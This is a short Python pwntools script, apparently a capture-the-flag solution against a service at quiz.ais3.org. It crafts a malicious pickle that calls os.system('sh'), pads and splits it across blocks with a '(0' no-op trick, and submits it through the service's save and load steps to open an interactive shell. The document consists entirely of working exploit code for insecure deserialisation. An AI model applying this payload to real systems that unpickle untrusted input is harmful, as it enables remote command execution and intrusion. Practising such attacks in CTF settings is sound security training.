from pwn import *
import pickle

p = remote('quiz.ais3.org', 2222)

# Original Pickle: b'\x80\x04U\x02osU\x06system\x93U\x02sh\x85R.'
'''
    0: \x80 PROTO      4
    2: U    SHORT_BINSTRING 'os'
    6: U    SHORT_BINSTRING 'system'
   14: \x93 STACK_GLOBAL
   15: U    SHORT_BINSTRING 'sh'
   19: \x85 TUPLE1
   20: R    REDUCE
   21: .    STOP
'''

# `(0` -> push&pop -> NOP
payload = ('AAAAAAAA' +
           '\x80\x04U\x02osU\x06system' + '(0' +  # [BLOCK1]
           'AAAAAAAAAAAAAAA' +
           '\x93U\x0dsh #AAAAAAAAA' +  # [BLOCK2]
           'AAAAAAAAAAAAAAA' +
           '\x85R.')  # [BLOCK3]

p.sendlineafter("Name: ", payload)
p.sendlineafter("Choose: ", "V")
evil_pkl = p.recvline().split(b": ")[1].decode()
p.sendline()

exploit = evil_pkl[32*4:32*5]+evil_pkl[32*6:32*7]+evil_pkl[32*8:]
print("[+] exp:", exploit)

p.sendlineafter("Choose: ", "L")
p.sendlineafter("Saved Data: ", exploit)
p.interactive()
